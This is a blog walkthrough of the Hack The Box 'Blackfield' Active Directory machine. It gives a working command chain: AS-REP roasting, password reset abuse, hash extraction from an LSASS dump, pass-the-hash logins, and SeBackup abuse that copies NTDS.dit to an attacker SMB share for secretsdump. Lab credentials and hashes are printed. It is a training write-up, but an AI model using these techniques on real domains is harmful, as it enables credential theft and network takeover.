---
title: "Blackfield"
date: 2024-10-21
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "blackfield", "htb walkthrough", "hackthebox", "writeup"]
---

# Blackfield

# Blackfield

## Notes
---
OS: Windows
Difficulty: Hard
Notes: 
tags:
  - "#LSASS_Dump"
  - "#SeBackup"
---

# To do 


# Findings 
## Credentials
```text
support@blackfield.local : #00^BlackKnight
audit2020@blackfield.local : H@CKTHEB0X# 
svc_backup : 9658d1d1dcd9250115e2205d9f48400d
```

# Enumeration
## Nmap
TCP
```sh
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-17 10:42:30Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

```

## SMB
![screenshot](/assets/images/blackfield1.png)

![screenshot](/assets/images/blackfield2.png)

```sh
# generate usernames from the directory list
smbclient -N \\\\10.10.10.192\\profiles$ -c ls | awk '{ print $1 }'
```

## Password Spray
With a user list and the Kerberos port open, we can try to spray the users Impacket's GetNpUsers.py in order to see if any user has Kerberos pre-authentication disabled.

```sh
impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```

![screenshot](/assets/images/blackfield3.png)

```sh
# crack hash using john
john krb5asrep --format=krb5asrep -w=/usr/share/wordlists/rockyou.txt
```

![screenshot](/assets/images/blackfield4.png)

```text
support@blackfiled.local : #00^BlackKnight
```

## BloodHound
```sh
sudo bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly
```

First Degree Object Control
Support has `ForceChangePassword` right to AUDIT2020. 

![screenshot](/assets/images/blackfield5.png)

To abuse this, we can use rpcclient to set the password.

```sh
rpcclient -U blackfield/support 10.10.10.192
rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
# setuserinfo username 23 password
```

![screenshot](/assets/images/blackfield6.png)

## Password Spray
```sh
nxc smb 10.10.10.192 -u audit2020 -p 'H@CKTHEB0X#' --shares
```

![screenshot](/assets/images/blackfield7.png)

![screenshot](/assets/images/blackfield8.png)

# Exploitation
# Foothold 
## LSASS
We connect to the forensic share and see a zipped lsass memory dump. LSASS is short for Local Security Authority Subsystem Service, and it stores credentials in memory on behalf of a user that has an active (or recently active) session. 

This allows the user to access network resources without re-typing their credentials for each service. LSASS may store credentials in multiple
forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.

So we download the lsass process memory dump locally for further inspection.

```sh
smbclient.py audit2020:'H@CKTHEB0X#'@10.10.10.192
use forensic
cd memory_analysis
ls
get lsass.zip
exit
```

![screenshot](/assets/images/blackfield9.png)
### Retrieve NT Hashes
After unzipping lsass.zip we can use [Pypykatz](https://github.com/skelsec/pypykatz) on the extracted lsass.DMP file to retrieve NT hashes.

```sh
pipx install pypykatz
pypykatz lsa minidump lsass.DMP
```

![screenshot](/assets/images/blackfield10.png)

![screenshot](/assets/images/blackfield11.png)
### Hash Spray
```sh
nxc smb 10.10.10.192 -u usernames.txt -H hashes
```
## Foothold
```sh
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```


# Privilege Escalation
## Enumeration

We can abuse the SeBackup privilege in order to retrieve files from the Administrator Desktop using robocopy. Using robocopy, we are able to retrieve a notes.txt but are denied access on root.txt.

```powershell
robocopy /b C:\Users\Administrator\Desktop\ C:\
```

## Exploitation

### Dumping Hashes with WBAdmin
So we need to get into the Administrator context. On way to do this is to abuse SeBackup and SeRestore privileges in order to dump the AD database. 

Then, we can use the administrator NTLM hash in a PtH (Pass the Hash) attack to get a shell as them. 

First we need to install and configure a samba server with authentication.

Modify the contents of `/etc/samba/smb.conf` to the following:

```powershell
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
interfaces = tun0
smb ports = 445
[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
force user = smbuser
```

Create a new user that matches the user in the force user parameter.
```powershell
adduser smbuser
```

Next, create a password for our newly created user.
```powershell
smbpasswd -a smbuser
```

Then start the SMB demon with service smbd restart . In our Win-Rm session we can mount the share:
```powershell
net use k: \\10.10.14.3\smb /user:smbuser smbpass
```

On the Win-Rm shell, we can backup the NTDS folder with wbadmin.
```shell
echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.3\smb -
include:c:\windows\ntds
```

Next, retrieve the version of the backup.
```powershell
wbadmin get versions
```

We can now restore the NTDS.dit file, specifying the backup version.
```shell
echo "Y" | wbadmin start recovery -version:10/01/2020-14:23 -itemtype:file -
items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreac
```

We need to export the system hive too, and transfer both this and the NTDS.dit to our local machine.

```powershell
reg save HKLM\SYSTEM C:\system.hive
```

Copy the files to our box via our mounted SMB drive.

```powershell
cp ntds.dit \\10.10.14.3\smb\NTDS.dit
cp system.hive \\10.10.14.3\smb\system.hive
```

Next, we can extract all the hashes in the domain using Impacketsecretsdump.py.

```powershell
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```

With the primary domain administrator hash, we can use wmiexec to get a shell (if we use psexec, the Administrator security context will not be preserved, and we will be NT AUTHORITY SYSTEM, which will not allow us to decrypt the file).

```powershell
wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192
```

